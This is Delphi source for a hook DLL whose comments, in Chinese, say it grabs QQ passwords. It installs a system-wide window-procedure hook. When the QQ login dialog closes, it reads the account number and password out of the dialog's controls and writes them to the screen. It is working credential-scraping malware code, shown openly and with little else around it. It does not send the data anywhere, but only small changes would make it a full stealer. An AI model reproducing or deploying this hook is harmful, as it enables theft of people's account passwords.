library HookDLL;

uses Windows, Messages;

var WndProcHook: DWORD;

 // 取QQ密码
procedure GetPassWord(Dialog: HWND);
var
  ComboBox, Edit: HWND;
  Buffer: array[0..20] of Char;
  TmpStr: string;
  ScreenDC: HDC;
begin
 // 约束条件
  if FindWindowEx(Dialog, 0, 'Button', '注册向导') = 0 then Exit;
  
  GetClassName(Dialog, Buffer, 20);
  if (Buffer <> '#32770') then Exit;

 // 控件句柄
  ComboBox := FindWindowEx(Dialog, 0, 'ComboBox', nil);
  if (ComboBox = 0) then Exit;

  Edit := FindWindowEx(Dialog, 0, 'Edit', nil);
  if (Edit = 0) then Exit;

 // 控件内容
  Buffer[GetWindowText(ComboBox, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := '号码: ' + Buffer;

  Buffer[GetWindowText(Edit, Buffer, 20)] := #0;
  if (Buffer[0] = #0) then Exit;
  TmpStr := TmpStr + '密码: ' + Buffer;

 // 写到屏幕
  ScreenDC := GetDC(0);
  TextOut(ScreenDC, 0, 0, PChar(TmpStr), Length(TmpStr));
  ReleaseDC(0, ScreenDC);
end;

 // 钩子回调
function CallWndProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
begin
 // 窗体即将被清除
  if (nCode = HC_ACTION) and (PCWPStruct(lParam).message = WM_DESTROY) then
    GetPassWord(PCWPStruct(lParam).hwnd);

 // 调用下一个钩子
  Result := CallNextHookEx(WndProcHook, nCode, wParam, lParam);
end;

 // 挂钩
procedure HookOn();
begin
  WndProcHook := SetWindowsHookEx(WH_CALLWNDPROC, @CallWndProc, HInstance, 0);
end;

 // 脱钩
procedure HookOff();
begin
  UnHookWindowsHookEx(WndProcHook);
end;     

 // 导出
exports HookOn, HookOff;
  
begin
end.    
